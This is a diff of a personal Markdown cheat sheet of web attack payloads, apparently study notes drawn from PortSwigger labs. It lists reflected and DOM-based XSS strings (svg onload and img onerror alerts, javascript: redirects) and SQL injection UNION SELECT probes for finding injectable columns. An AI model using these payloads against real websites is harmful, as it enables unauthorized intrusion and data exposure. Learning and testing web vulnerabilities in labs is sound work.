@@ -3,6 +3,8 @@
 * [SQLi](#SQLi)
 
 
+
+
 # **<a name="xss">XSS</a>**
 
 ## Reflected 
@@ -47,31 +49,38 @@ If you search 5333 in search bar
 
 in javascript function calls 
 
-                        function trackSearch(query) 
-                        {document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');}
-                        var query = (new URLSearchParams(window.location.search)).get('search');
-                        if(query){trackSearch(query);}
-                    
-                        <img src="/resources/images/tracker.gif?searchTerms=5333">
-                        
-                        
+    function trackSearch(query) 
+    {document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');}
+    var query = (new URLSearchParams(window.location.search)).get('search');
+    if(query){trackSearch(query);}  
+    <img src="/resources/images/tracker.gif?searchTerms=5333">
+                                          
 search for 
 
 ` "><svg onload=alert(1)>`
 
 this will break out new paramiter in javascript
 
- Document sink
+     <img src="/resources/images/tracker.gif?searchTerms=">
+     <svg onload="alert(1)">"&gt;
+     <section class="blog-list">
+     </section></svg>
+
+
+### Sinks
+
+https://brutelogic.com.br/blog/dom-based-xss-the-3-sinks/
+
+Document sink
  
- `name=<img+src+onerror=alert(1)>`
+`name=<img+src+onerror=alert(1)>`
  
- Location sink
+Location sink
  
- `redir=javascript:alert(1)`
+`redir=javascript:alert(1)`  
+`&storeId="></select><img+src%3d1+onerror%3dalert(1)>`
  
- `&storeId="></select><img+src%3d1+onerror%3dalert(1)>`
- 
-  Execution sink eval call error
+Execution sink eval call error
   
   `index=alert(1)`
   
@@ -89,7 +98,42 @@ this will break out new paramiter in javascript
 
 Injection
 
-`xyz' UNION SELECT 'a' WHERE 1=1--`
-
+`xyz' UNION SELECT 'a' WHERE 1=1--`  
 `xyz' UNION SELECT 'a' WHERE 1=2--`
 
+Finding injectable fields  
+
+`GET /filter?category=Accessories'+UNION+SELECT+NULL,'Injectable',NULL--+ HTTP/1.1`  
+`' UNION SELECT 'a',NULL,NULL,NULL--`  
+`' UNION SELECT NULL,'a',NULL,NULL--`  
+`' UNION SELECT NULL,NULL,'a',NULL--`  
+`' UNION SELECT NULL,NULL,NULL,'a'--`  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Referances:
+
+https://portswigger.net/web-security
